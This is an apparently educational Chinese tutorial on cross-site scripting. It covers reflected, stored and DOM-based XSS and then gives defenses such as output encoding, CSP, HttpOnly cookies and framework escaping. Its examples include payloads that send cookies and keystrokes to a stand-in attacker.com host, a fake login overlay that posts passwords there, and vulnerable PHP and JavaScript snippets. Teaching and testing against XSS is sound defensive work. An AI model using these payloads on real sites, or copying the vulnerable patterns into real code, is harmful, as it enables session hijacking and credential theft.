# XSS 攻击详解

## 什么是 XSS 攻击

XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的 Web 安全漏洞。攻击者通过在目标网站中注入恶意脚本代码，当其他用户浏览该网站时，恶意脚本会在用户浏览器中执行，从而窃取用户信息、劫持用户会话或进行其他恶意操作。

## XSS 攻击类型与实现

### 反射型 XSS（Reflected XSS）

**原理与特点**：反射型 XSS 是最常见的 XSS 攻击类型，恶意脚本通过 URL 参数、表单提交等方式直接反射回页面，不会被存储在服务器上。

**攻击流程**：构造恶意 URL → 社会工程学诱导点击 → 脚本执行 → 数据窃取

**攻击示例**：

```
# 基础示例
http://example.com/search?query=<script>alert('XSS')</script>

# Cookie 窃取
http://example.com/search?q=<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>

# 键盘记录
<script>
document.addEventListener('keypress', function(e) {
  fetch('http://attacker.com/log.php', {
    method: 'POST',
    body: 'key=' + e.key
  });
});
</script>
```

**易受攻击的代码**：

```php
<?php
$search = $_GET['search'];
echo "<h1>搜索结果: " . $search . "</h1>";
?>
```

### 存储型 XSS（Stored XSS）

**原理与特点**：存储型 XSS 危害最大，恶意脚本被永久存储在服务器上，每当用户访问包含恶意脚本的页面时都会被攻击。常见于评论系统、用户资料、论坛帖子等功能。

**攻击流程**：寻找输入点 → 构造载荷 → 提交内容 → 持久化存储 → 批量感染

**攻击示例**：

```html
<!-- 评论区攻击 -->
这是一条正常的评论
<script>
  var img = new Image();
  img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
</script>

<!-- 钓鱼攻击 -->
<div
  style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;"
>
  <h2>系统升级中，请重新登录</h2>
  <form action="http://attacker.com/phishing.php" method="post">
    用户名: <input type="text" name="username" /><br />
    密码: <input type="password" name="password" /><br />
    <input type="submit" value="登录" />
  </form>
</div>
```

### DOM 型 XSS（DOM-based XSS）

**原理与特点**：DOM 型 XSS 是客户端 XSS，攻击载荷从未发送到服务器，通过修改页面 DOM 环境执行恶意脚本。数据来源包括 URL、本地存储、postMessage 等。

**危险函数**：`innerHTML`、`eval()`、`document.write()`、`setTimeout()`、`location.href` 等

**攻击示例**：

```html
<!-- innerHTML 攻击 -->
<script>
  var hash = location.hash.substr(1);
  document.getElementById("content").innerHTML = "欢迎: " + hash;
</script>
<!-- 攻击URL: http://example.com/page.html#<img src=x onerror=alert('XSS')> -->

<!-- eval 函数攻击 -->
<script>
  var userInput = location.search.substr(1);
  eval('var userMsg = "' + userInput + '"');
</script>
<!-- 攻击URL: http://example.com/page.html?"; alert('XSS'); var dummy=" -->
```

## XSS 攻击危害与防护

### 主要危害

- **数据窃取**：Cookie、会话信息、个人数据
- **身份冒充**：会话劫持、权限提升
- **恶意操作**：钓鱼攻击、恶意重定向、键盘记录
- **蠕虫传播**：在社交网站中自动传播

### 核心防护策略

**输入验证与输出编码**：

```javascript
// HTML 编码
function htmlEncode(str) {
  return str.replace(/[<>&"']/g, function (match) {
    return {
      "<": "&lt;",
      ">": "&gt;",
      "&": "&amp;",
      '"': "&quot;",
      "'": "&#39;",
    }[match];
  });
}

// 安全的 DOM 操作
element.textContent = userInput; // 安全
// element.innerHTML = userInput; // 危险
```

**内容安全策略（CSP）**：

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self';"
/>
```

**HttpOnly Cookie**：

```javascript
document.cookie = "sessionId=abc123; HttpOnly; Secure; SameSite=Strict";
```

**现代框架防护**：

```jsx
// React - 默认安全
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>; // 自动转义
}

// Vue.js - 文本插值安全
<template>
  <div>{{ userInput }}</div> <!-- 安全 -->
  <div v-html="userInput"></div> <!-- 危险 -->
</template>
```

## 检测与测试

**常用测试载荷**：

```html
<script>
  alert("XSS");
</script>
<img src=x onerror=alert('XSS')> <svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')"></iframe>
```

**检测工具**：使用 OWASP ZAP、Burp Suite 等安全测试工具，或编写自动化脚本进行漏洞扫描。
